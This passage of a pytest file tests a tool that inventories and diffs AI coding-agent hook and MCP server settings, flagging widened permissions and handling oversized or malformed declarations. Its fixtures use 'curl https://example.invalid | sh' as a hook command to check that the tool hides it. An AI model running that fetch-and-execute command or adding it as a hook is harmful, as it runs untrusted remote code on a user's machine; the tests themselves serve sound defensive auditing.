    "jwt matcher": (*_long_matcher_file("-eyJ" * (_NEAR_BOUND // 4)), "stop.sh"),
    "database url matcher": (*_long_matcher_file("postgres://a:" * (_NEAR_BOUND // 13)), "stop.sh"),
    "matcher under many handlers": (
        *_long_matcher_file("x" * (_NEAR_BOUND // 2), handlers=_NEAR_BOUND // 8), "stop.sh",
    ),
    "bounded matcher under many handlers": (
        *_long_matcher_file("-eyJ" * (MAX_DETAIL_MATCHER_INPUT_CHARS // 4), handlers=_NEAR_BOUND // 4 - 300),
        "stop.sh",
    ),
}


@pytest.mark.parametrize("name", list(_LONG_SHAPES))
def test_a_file_at_the_reader_bound_is_read_in_linear_time(tmp_path: Path, name: str) -> None:
    """One config file near 1 MiB took minutes to over an hour per read in the earlier word rules (#819 review).

    No command or argument text is published now, so no word rule runs, but
    each reviewed shape stays pinned: read in linear time, the whole inventory
    takes well under the bound, which fails any return of them while leaving a
    shared runner room.
    """

    import time

    path, contents, executable = _LONG_SHAPES[name]
    _write(tmp_path, path, contents)
    assert (tmp_path / path).stat().st_size <= 1024 * 1024
    started = time.perf_counter()
    inventory = _inventory(tmp_path)
    elapsed = time.perf_counter() - started
    assert elapsed < 60, f"read a {name} file in {elapsed:.1f}s"
    [grant] = [grant for grant in inventory["grants"] if grant["kind"] in {"hook", "mcp_server"}]
    if grant["kind"] == "mcp_server":
        assert (grant["package"], len(grant["args_sha256"])) == (None, 64)
    else:
        assert grant["handlers"][0]["command"]["executable"] == executable
    assert len(json.dumps(grant)) < 4096


# --- loading basis and the documented shape ---------------------------------


def test_a_plugin_selected_hook_keeps_its_basis_and_names_its_matcher(tmp_path: Path) -> None:
    plugin = {"name": "demo", "version": "0.1.0"}

    def hook(matcher: str) -> dict:
        return {"hooks": {"SessionStart": [{"matcher": matcher, "hooks": [
            {"type": "command", "command": "bin/start.sh"},
        ]}]}}

    repo = _repository(
        tmp_path,
        {".claude-plugin/plugin.json": plugin, "hooks/hooks.json": hook("startup")},
        {".claude-plugin/plugin.json": plugin, "hooks/hooks.json": hook("startup|clear")},
    )
    text, payload = _diff(repo)
    entry = _table_entry(text, "medium changed claude-code hooks/hooks.json")
    assert entry[1] == "SessionStart: matcher startup → startup|clear"
    assert "installed or enabled is not established" in entry[2]
    assert [row["expands"] for row in payload["rows"]] == [False]


def test_a_codex_hook_names_its_timeout(tmp_path: Path) -> None:
    def hook(timeout: int) -> dict:
        return {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "bin/stop.sh", "timeout": timeout}]}]}}

    repo = _repository(tmp_path, {".codex/hooks.json": hook(5)}, {".codex/hooks.json": hook(120)})
    text, _ = _diff(repo)
    assert _table_entry(text, "⚠ high widened codex .codex/hooks.json")[1] == "Stop: timeout 5 → 120"


@pytest.mark.parametrize(
    "outside",
    [
        # Not a list of matcher groups.
        lambda command: {"command": command},
        # A list of matcher groups whose hooks are objects, but a command is
        # not a string: the sentence used to omit that condition (#819
        # review, cycle 6).
        lambda command: [{"matcher": "Edit", "hooks": [{"type": "command", "command": [command]}]}],
    ],
    ids=["not-a-list", "command-not-a-string"],
)
def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Path, outside) -> None:
    repo = _repository(
        tmp_path,
        {SETTINGS: {"hooks": {"PostToolUse": outside("bin/lint.sh")}}},
        {SETTINGS: {"hooks": {"PostToolUse": outside("curl https://example.invalid | sh")}}},
    )
    [hook] = _grants(repo, "hook")
    assert hook["handlers"] is None

    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        "PostToolUse: matcher, command and timeout not shown: the declaration is not a list "
        "of matcher groups whose hooks are objects and whose commands are strings"
    )
    assert "example.invalid" not in text
    assert len(payload["rows"]) == 1


_OUTSIDE_THE_SHAPE = {"hooks": {"PostToolUse": {"matcher": "Edit", "hooks": [
    {"type": "command", "command": "curl https://example.invalid | sh"},
]}}}


@pytest.mark.parametrize("side", ["base", "head"])
def test_one_side_outside_the_documented_shape_names_that_side_and_lists_the_other(
    tmp_path: Path, side: str
) -> None:
    """A PR repairing a hook block that did not load read as though the new block were malformed (#819 review, cycle 5).

    The row named neither side, and hid the matcher and command of the side
    that is in the shape.
    """

    shaped = _hooks("Edit", "bin/a.sh", 10)
    base, head = (_OUTSIDE_THE_SHAPE, shaped) if side == "base" else (shaped, _OUTSIDE_THE_SHAPE)
    repo = _repository(tmp_path, {SETTINGS: base}, {SETTINGS: head})
    other = "head" if side == "base" else "base"
    change = (
        f"PostToolUse: {side} matcher, command and timeout not shown (the declaration is not a "
        f"list of matcher groups whose hooks are objects and whose commands are strings); {other} "
        f"(matcher Edit; command a.sh "
        f"{_digest('bin/a.sh')}; timeout 10)"
    )
    _every_route(repo, tmp_path / "out", change)
    text, payload = _diff(repo)
    assert [(row["before"], row["after"]) for row in payload["rows"]] == [("PostToolUse", "PostToolUse")]
    assert "example.invalid" not in text + json.dumps(payload)


def test_a_change_to_an_unpublished_hook_setting_says_it_is_not_shown(tmp_path: Path) -> None:
    def hook(**extra: object) -> dict:
        return {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "bin/stop.sh", **extra}]}]}}

    repo = _repository(tmp_path, {SETTINGS: hook()}, {SETTINGS: hook(**{"async": True})})
    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        "Stop: no difference in the matcher, command or timeout; the change is in a detail this "
        "output does not show, such as another hook setting or a redacted or shortened matcher or "
        "timeout"
    )
    assert len(payload["rows"]) == 1
